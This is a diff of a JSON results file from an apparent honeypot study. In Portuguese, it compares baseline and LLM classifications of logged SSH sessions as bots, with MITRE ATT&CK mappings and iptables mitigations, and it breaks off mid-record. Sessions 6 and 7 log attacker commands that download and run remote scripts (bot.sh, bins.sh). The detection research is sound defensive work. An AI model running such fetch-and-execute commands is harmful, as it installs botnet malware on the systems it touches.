@@ -3,13 +3,26 @@
     "ordem": 1,
     "session_id": "bot_01_9a1c3012f411",
     "src_ip": "185.220.101.42",
+    "duracao_segundos": 1.1,
+    "pausas_segundos": [
+      1
+    ],
     "comandos": [
       "uname -s -v -n -r -m"
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -s -v -n -r -m (+1s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -s -v -n -r -m"
     ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "retido_no_filtro_l1": true,
     "classificacao_baseline_heuristico": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
     "classificacao_llm_direto": "BOT_AUTOMATIZADO",
+    "classificacao_llm_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_llm_sem_tempos": "BOT_AUTOMATIZADO",
     "tempo_segundos_api": 1.13,
     "resposta_crua_llm": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -34,6 +47,29 @@
         "uname -s -v -n -r -m"
       ]
     },
+    "resposta_crua_llm_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "Execução de comando único de reconhecimento inicial do sistema operacional por um IP de origem associado a redes de anonimização (Tor exit node).",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -s -v -n -r -m"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 185.220.101.42 -j DROP"
+      ],
+      "session_id": "bot_01_9a1c3012f411",
+      "src_ip": "185.220.101.42",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.88,
+      "comandos": [
+        "uname -s -v -n -r -m"
+      ]
+    },
     "conferencia_mitre": {
       "status": "EXATO",
       "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
@@ -49,13 +85,26 @@
     "ordem": 2,
     "session_id": "bot_02_1fe070084516",
     "src_ip": "77.239.124.147",
+    "duracao_segundos": 1.0,
+    "pausas_segundos": [
+      0
+    ],
     "comandos": [
       "uname -s -v -n -r -m"
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -s -v -n -r -m (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -s -v -n -r -m"
     ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "retido_no_filtro_l1": true,
     "classificacao_baseline_heuristico": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
     "classificacao_llm_direto": "BOT_AUTOMATIZADO",
+    "classificacao_llm_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_llm_sem_tempos": "BOT_AUTOMATIZADO",
     "tempo_segundos_api": 1.05,
     "resposta_crua_llm": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -80,6 +129,29 @@
         "uname -s -v -n -r -m"
       ]
     },
+    "resposta_crua_llm_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "Execução única de comando de reconhecimento do sistema operacional para identificação do alvo por um script ou scanner automatizado.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -s -v -n -r -m"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 77.239.124.147 -j DROP"
+      ],
+      "session_id": "bot_02_1fe070084516",
+      "src_ip": "77.239.124.147",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.07,
+      "comandos": [
+        "uname -s -v -n -r -m"
+      ]
+    },
     "conferencia_mitre": {
       "status": "EXATO",
       "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
@@ -95,13 +167,26 @@
     "ordem": 3,
     "session_id": "bot_03_4b8e2109c312",
     "src_ip": "109.160.32.178",
+    "duracao_segundos": 0.9,
+    "pausas_segundos": [
+      0
+    ],
     "comandos": [
       "uname -s -v -n -r -m"
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -s -v -n -r -m (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -s -v -n -r -m"
     ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "retido_no_filtro_l1": true,
     "classificacao_baseline_heuristico": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
     "classificacao_llm_direto": "BOT_AUTOMATIZADO",
+    "classificacao_llm_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_llm_sem_tempos": "BOT_AUTOMATIZADO",
     "tempo_segundos_api": 3.03,
     "resposta_crua_llm": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -126,6 +211,29 @@
         "uname -s -v -n -r -m"
       ]
     },
+    "resposta_crua_llm_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "Execução de comando único de reconhecimento de sistema operacional (uname) típico de escaneamento inicial por bots.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -s -v -n -r -m"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 109.160.32.178 -j DROP"
+      ],
+      "session_id": "bot_03_4b8e2109c312",
+      "src_ip": "109.160.32.178",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.26,
+      "comandos": [
+        "uname -s -v -n -r -m"
+      ]
+    },
     "conferencia_mitre": {
       "status": "EXATO",
       "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
@@ -141,13 +249,26 @@
     "ordem": 4,
     "session_id": "bot_04_7c2d9018a104",
     "src_ip": "27.102.116.43",
+    "duracao_segundos": 0.8,
+    "pausas_segundos": [
+      0
+    ],
     "comandos": [
       "echo xsec"
+    ],
+    "comandos_com_tempo": [
+      "[1] echo xsec (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] echo xsec"
     ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "retido_no_filtro_l1": true,
     "classificacao_baseline_heuristico": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
     "classificacao_llm_direto": "BOT_AUTOMATIZADO",
+    "classificacao_llm_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_llm_sem_tempos": "BOT_AUTOMATIZADO",
     "tempo_segundos_api": 1.11,
     "resposta_crua_llm": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -172,6 +293,29 @@
         "echo xsec"
       ]
     },
+    "resposta_crua_llm_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "Execução de comando único de reconhecimento ou teste de conectividade por bot automatizado.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1033",
+          "technique_name": "System Owner/User Discovery",
+          "evidence": "echo xsec"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 27.102.116.43 -j DROP"
+      ],
+      "session_id": "bot_04_7c2d9018a104",
+      "src_ip": "27.102.116.43",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.2,
+      "comandos": [
+        "echo xsec"
+      ]
+    },
     "conferencia_mitre": {
       "status": "PARCIAL",
       "justificativa": "O comando echo xsec apenas imprime uma string de verificacao pos-login no shell (T1059.004), nao configurando varredura ativa de rede pre-comprometimento (T1595)."
@@ -187,13 +331,26 @@
     "ordem": 5,
     "session_id": "bot_05_3e7f1042b819",
     "src_ip": "154.18.197.29",
+    "duracao_segundos": 1.2,
+    "pausas_segundos": [
+      1
+    ],
     "comandos": [
       "echo xsec"
+    ],
+    "comandos_com_tempo": [
+      "[1] echo xsec (+1s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] echo xsec"
     ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "retido_no_filtro_l1": true,
     "classificacao_baseline_heuristico": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
     "classificacao_llm_direto": "BOT_AUTOMATIZADO",
+    "classificacao_llm_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_llm_sem_tempos": "BOT_AUTOMATIZADO",
     "tempo_segundos_api": 1.09,
     "resposta_crua_llm": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -218,6 +375,29 @@
         "echo xsec"
       ]
     },
+    "resposta_crua_llm_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "O IP de origem executou um comando simples 'echo xsec', típico de sondagem inicial ou teste de conectividade por botnets ou scanners automatizados.",
+      "mitre_attack": [
+        {
+          "tactic": "Reconnaissance",
+          "technique_id": "T1595",
+          "technique_name": "Active Scanning",
+          "evidence": "echo xsec"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 154.18.197.29 -j DROP"
+      ],
+      "session_id": "bot_05_3e7f1042b819",
+      "src_ip": "154.18.197.29",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.16,
+      "comandos": [
+        "echo xsec"
+      ]
+    },
     "conferencia_mitre": {
       "status": "PARCIAL",
       "justificativa": "Criterio uniforme para echo xsec: o comando apenas imprime uma string de teste no shell (T1059.004), nao coletando informacoes do host na fase de reconhecimento (T1592)."
@@ -233,16 +413,38 @@
     "ordem": 6,
     "session_id": "bot_06_a84f92c10e3b",
     "src_ip": "45.142.214.18",
+    "duracao_segundos": 1.5,
+    "pausas_segundos": [
+      0,
+      0,
+      1,
+      0
+    ],
     "comandos": [
       "cd /tmp",
       "wget http://45.142.214.18/bot.sh",
       "chmod +x bot.sh",
       "./bot.sh"
     ],
+    "comandos_com_tempo": [
+      "[1] cd /tmp (+0s)",
+      "[2] wget http://45.142.214.18/bot.sh (+0s)",
+      "[3] chmod +x bot.sh (+1s)",
+      "[4] ./bot.sh (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] cd /tmp",
+      "[2] wget http://45.142.214.18/bot.sh",
+      "[3] chmod +x bot.sh",
+      "[4] ./bot.sh"
+    ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "retido_no_filtro_l1": true,
     "classificacao_baseline_heuristico": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
     "classificacao_llm_direto": "BOT_AUTOMATIZADO",
+    "classificacao_llm_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_llm_sem_tempos": "BOT_AUTOMATIZADO",
     "tempo_segundos_api": 1.41,
     "resposta_crua_llm": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -278,6 +480,40 @@
         "./bot.sh"
       ]
     },
+    "resposta_crua_llm_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "CRÍTICO",
+      "summary": "O ator malicioso executou um script de botnet de forma automatizada e sequencial no diretório temporário, fazendo o download, alterando a permissão e executando o payload em menos de dois segundos.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1059.004",
+          "technique_name": "Command and Scripting Interpreter: Unix Shell",
+          "evidence": "wget http://45.142.214.18/bot.sh && chmod +x bot.sh && ./bot.sh"
+        },
+        {
+          "tactic": "Ingress Tool Transfer",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "evidence": "wget http://45.142.214.18/bot.sh"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 45.142.214.18 -j DROP",
+        "rm -f /tmp/bot.sh",
+        "pkill -f bot.sh"
+      ],
+      "session_id": "bot_06_a84f92c10e3b",
+      "src_ip": "45.142.214.18",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.4,
+      "comandos": [
+        "cd /tmp",
+        "wget http://45.142.214.18/bot.sh",
+        "chmod +x bot.sh",
+        "./bot.sh"
+      ]
+    },
     "conferencia_mitre": {
       "status": "EXATO",
       "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
@@ -293,15 +529,34 @@
     "ordem": 7,
     "session_id": "bot_07_c72e11049b21",
     "src_ip": "185.220.101.42",
+    "duracao_segundos": 1.4,
+    "pausas_segundos": [
+      0,
+      1,
+      0
+    ],
     "comandos": [
       "cd /tmp",
       "curl -O http://185.220.101.42/bins.sh",
       "sh bins.sh"
     ],
+    "comandos_com_tempo": [
+      "[1] cd /tmp (+0s)",
+      "[2] curl -O http://185.220.101.42/bins.sh (+1s)",
+      "[3] sh bins.sh (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] cd /tmp",
+      "[2] curl -O http://185.220.101.42/bins.sh",
+      "[3] sh bins.sh"
+    ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "retido_no_filtro_l1": true,
     "classificacao_baseline_heuristico": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
     "classificacao_llm_direto": "BOT_AUTOMATIZADO",
+    "classificacao_llm_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_llm_sem_tempos": "BOT_AUTOMATIZADO",
     "tempo_segundos_api": 1.28,
     "resposta_crua_llm": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -335,6 +590,38 @@
         "sh bins.sh"
       ]
     },
+    "resposta_crua_llm_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "ALTO",
+      "summary": "O invasor acessou o diretório temporário, baixou um script malicioso via curl de um IP externo suspeito e executou-o imediatamente, comportamento típico de infecção automatizada por malware ou botnet.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1059.004",
+          "technique_name": "Command and Scripting Interpreter: Unix Shell",
+          "evidence": "sh bins.sh"
+        },
+        {
+          "tactic": "Ingress Tool Transfer",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "evidence": "curl -O http://185.220.101.42/bins.sh"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 185.220.101.42 -j DROP",
+        "rm -f /tmp/bins.sh"
+      ],
+      "session_id": "bot_07_c72e11049b21",
+      "src_ip": "185.220.101.42",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.51,
+      "comandos": [
+        "cd /tmp",
+        "curl -O http://185.220.101.42/bins.sh",
+        "sh bins.sh"
+      ]
+    },
     "conferencia_mitre": {
       "status": "EXATO",
       "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
@@ -350,13 +637,26 @@
     "ordem": 8,
     "session_id": "bot_08_5d9a8120e402",
     "src_ip": "91.240.118.172",
+    "duracao_segundos": 1.0,
+    "pausas_segundos": [
+      0
+    ],
     "comandos": [
       "cat /proc/cpuinfo"
+    ],
+    "comandos_com_tempo": [
+      "[1] cat /proc/cpuinfo (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] cat /proc/cpuinfo"
     ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "retido_no_filtro_l1": true,
     "classificacao_baseline_heuristico": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
     "classificacao_llm_direto": "BOT_AUTOMATIZADO",
+    "classificacao_llm_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_llm_sem_tempos": "BOT_AUTOMATIZADO",
     "tempo_segundos_api": 1.16,
     "resposta_crua_llm": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -381,6 +681,29 @@
         "cat /proc/cpuinfo"
       ]
     },
+    "resposta_crua_llm_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "Execução de comando único de reconhecimento básico de hardware por script ou scanner automatizado.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "cat /proc/cpuinfo"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 91.240.118.172 -j DROP"
+      ],
+      "session_id": "bot_08_5d9a8120e402",
+      "src_ip": "91.240.118.172",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.04,
+      "comandos": [
+        "cat /proc/cpuinfo"
+      ]
+    },
     "conferencia_mitre": {
       "status": "EXATO",
       "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
@@ -396,13 +719,26 @@
     "ordem": 9,
     "session_id": "bot_09_8f1b4039d715",
     "src_ip": "193.32.162.159",
+    "duracao_segundos": 0.7,
+    "pausas_segundos": [
+      0
+    ],
     "comandos": [
       "uname -a"
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -a (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -a"
     ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "retido_no_filtro_l1": true,
     "classificacao_baseline_heuristico": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
     "classificacao_llm_direto": "BOT_AUTOMATIZADO",
+    "classificacao_llm_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_llm_sem_tempos": "BOT_AUTOMATIZADO",
     "tempo_segundos_api": 1.05,
     "resposta_crua_llm": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -427,6 +763,29 @@
         "uname -a"
       ]
     },
+    "resposta_crua_llm_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "Execução única de comando de reconhecimento básico pelo IP 193.32.162.159.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -a"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 193.32.162.159 -j DROP"
+      ],
+      "session_id": "bot_09_8f1b4039d715",
+      "src_ip": "193.32.162.159",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 0.99,
+      "comandos": [
+        "uname -a"
+      ]
+    },
     "conferencia_mitre": {
       "status": "EXATO",
       "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
@@ -442,13 +801,26 @@
     "ordem": 10,
     "session_id": "bot_10_2a6c7051f908",
     "src_ip": "89.248.165.58",
+    "duracao_segundos": 0.9,
+    "pausas_segundos": [
+      0
+    ],
     "comandos": [
       "uname -s -v -n -r -m"
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -s -v -n -r -m (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -s -v -n -r -m"
     ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "retido_no_filtro_l1": true,
     "classificacao_baseline_heuristico": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
     "classificacao_llm_direto": "BOT_AUTOMATIZADO",
+    "classificacao_llm_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_llm_sem_tempos": "BOT_AUTOMATIZADO",
     "tempo_segundos_api": 1.06,
     "resposta_crua_llm": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -473,6 +845,29 @@
         "uname -s -v -n -r -m"
       ]
     },
+    "resposta_crua_llm_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "Execução de comando único de reconhecimento (uname) típica de varredura automatizada.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -s -v -n -r -m"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 89.248.165.58 -j DROP"
+      ],
+      "session_id": "bot_10_2a6c7051f908",
+      "src_ip": "89.248.165.58",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.04,
+      "comandos": [
+        "uname -s -v -n -r -m"
+      ]
+    },
     "conferencia_mitre": {
       "status": "EXATO",
       "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
@@ -488,13 +883,26 @@
     "ordem": 11,
     "session_id": "bot_11_6e3d2094a517",
     "src_ip": "45.155.205.233",
+    "duracao_segundos": 1.1,
+    "pausas_segundos": [
+      1
+    ],
     "comandos": [
       "uname -s -v -n -r -m"
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -s -v -n -r -m (+1s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -s -v -n -r -m"
     ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "retido_no_filtro_l1": true,
     "classificacao_baseline_heuristico": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
     "classificacao_llm_direto": "BOT_AUTOMATIZADO",
+    "classificacao_llm_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_llm_sem_tempos": "BOT_AUTOMATIZADO",
     "tempo_segundos_api": 1.08,
     "resposta_crua_llm": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -519,6 +927,29 @@
         "uname -s -v -n -r -m"
       ]
     },
+    "resposta_crua_llm_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "MÉDIO",
+      "summary": "Execução de comando único de reconhecimento do sistema operacional utilizando uname, típico de escaneamento automatizado pós-exploração.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -s -v -n -r -m"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 45.155.205.233 -j DROP"
+      ],
+      "session_id": "bot_11_6e3d2094a517",
+      "src_ip": "45.155.205.233",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.13,
+      "comandos": [
+        "uname -s -v -n -r -m"
+      ]
+    },
     "conferencia_mitre": {
       "status": "EXATO",
       "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
@@ -534,13 +965,26 @@
     "ordem": 12,
     "session_id": "bot_12_1c8f5073b214",
     "src_ip": "194.26.29.114",
+    "duracao_segundos": 0.8,
+    "pausas_segundos": [
+      0
+    ],
     "comandos": [
       "echo xsec"
+    ],
+    "comandos_com_tempo": [
+      "[1] echo xsec (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] echo xsec"
     ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "retido_no_filtro_l1": true,
     "classificacao_baseline_heuristico": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
     "classificacao_llm_direto": "BOT_AUTOMATIZADO",
+    "classificacao_llm_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_llm_sem_tempos": "BOT_AUTOMATIZADO",
     "tempo_segundos_api": 1.09,
     "resposta_crua_llm": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -565,6 +1009,29 @@
         "echo xsec"
       ]
     },
+    "resposta_crua_llm_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "Execução de comando único de reconhecimento ou teste de conexão por um scanner automatizado.",
+      "mitre_attack": [
+        {
+          "tactic": "Reconnaissance",
+          "technique_id": "T1595",
+          "technique_name": "Active Scanning",
+          "evidence": "echo xsec"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 194.26.29.114 -j DROP"
+      ],
+      "session_id": "bot_12_1c8f5073b214",
+      "src_ip": "194.26.29.114",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.04,
+      "comandos": [
+        "echo xsec"
+      ]
+    },
     "conferencia_mitre": {
       "status": "PARCIAL",
       "justificativa": "Criterio uniforme para echo xsec: o comando imprime string fixa de verificacao (T1059.004) sem consultar dados do sistema operacional (T1082)."
@@ -580,13 +1047,26 @@
     "ordem": 13,
     "session_id": "bot_13_9d4e6018c623",
     "src_ip": "185.156.73.54",
+    "duracao_segundos": 1.0,
+    "pausas_segundos": [
+      0
+    ],
     "comandos": [
       "uname -s -v -n -r -m"
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -s -v -n -r -m (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -s -v -n -r -m"
     ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "retido_no_filtro_l1": true,
     "classificacao_baseline_heuristico": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
     "classificacao_llm_direto": "BOT_AUTOMATIZADO",
+    "classificacao_llm_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_llm_sem_tempos": "BOT_AUTOMATIZADO",
     "tempo_segundos_api": 1.19,
     "resposta_crua_llm": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -611,6 +1091,29 @@
         "uname -s -v -n -r -m"
       ]
     },
+    "resposta_crua_llm_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "Execução de comando único de reconhecimento de sistema operacional (uname) típico de escaneamento inicial por bot automatizado.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -s -v -n -r -m"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 185.156.73.54 -j DROP"
+      ],
+      "session_id": "bot_13_9d4e6018c623",
+      "src_ip": "185.156.73.54",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.13,
+      "comandos": [
+        "uname -s -v -n -r -m"
+      ]
+    },
     "conferencia_mitre": {
       "status": "EXATO",
       "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
@@ -626,13 +1129,26 @@
     "ordem": 14,
     "session_id": "bot_14_4f2a9081d309",
     "src_ip": "5.188.206.14",
+    "duracao_segundos": 0.9,
+    "pausas_segundos": [
+      0
+    ],
     "comandos": [
       "cat /proc/cpuinfo"
+    ],
+    "comandos_com_tempo": [
+      "[1] cat /proc/cpuinfo (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] cat /proc/cpuinfo"
     ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "retido_no_filtro_l1": true,
     "classificacao_baseline_heuristico": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
     "classificacao_llm_direto": "BOT_AUTOMATIZADO",
+    "classificacao_llm_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_llm_sem_tempos": "BOT_AUTOMATIZADO",
     "tempo_segundos_api": 0.97,
     "resposta_crua_llm": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -657,6 +1173,29 @@
         "cat /proc/cpuinfo"
       ]
     },
+    "resposta_crua_llm_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "Execução única de comando para reconhecimento básico do sistema (leitura de cpuinfo), típico de scripts automatizados de sondagem.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "cat /proc/cpuinfo"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 5.188.206.14 -j DROP"
+      ],
+      "session_id": "bot_14_4f2a9081d309",
+      "src_ip": "5.188.206.14",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.07,
+      "comandos": [
+        "cat /proc/cpuinfo"
+      ]
+    },
     "conferencia_mitre": {
       "status": "EXATO",
       "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
@@ -672,13 +1211,26 @@
     "ordem": 15,
     "session_id": "bot_15_7b5c1037e826",
     "src_ip": "141.98.11.45",
+    "duracao_segundos": 1.1,
+    "pausas_segundos": [
+      1
+    ],
     "comandos": [
       "uname -s -v -n -r -m"
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -s -v -n -r -m (+1s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -s -v -n -r -m"
     ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "retido_no_filtro_l1": true,
     "classificacao_baseline_heuristico": "BOT_AUTOMATIZADO",
+    "classificacao_baseline_pausa_3s": "BOT_AUTOMATIZADO",
     "classificacao_llm_direto": "BOT_AUTOMATIZADO",
+    "classificacao_llm_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_llm_sem_tempos": "BOT_AUTOMATIZADO",
     "tempo_segundos_api": 0.99,
     "resposta_crua_llm": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -703,6 +1255,29 @@
         "uname -s -v -n -r -m"
       ]
     },
+    "resposta_crua_llm_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "Execução de comando único de reconhecimento básico (uname) por um IP externo, característico de varredura automatizada.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -s -v -n -r -m"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 141.98.11.45 -j DROP"
+      ],
+      "session_id": "bot_15_7b5c1037e826",
+      "src_ip": "141.98.11.45",
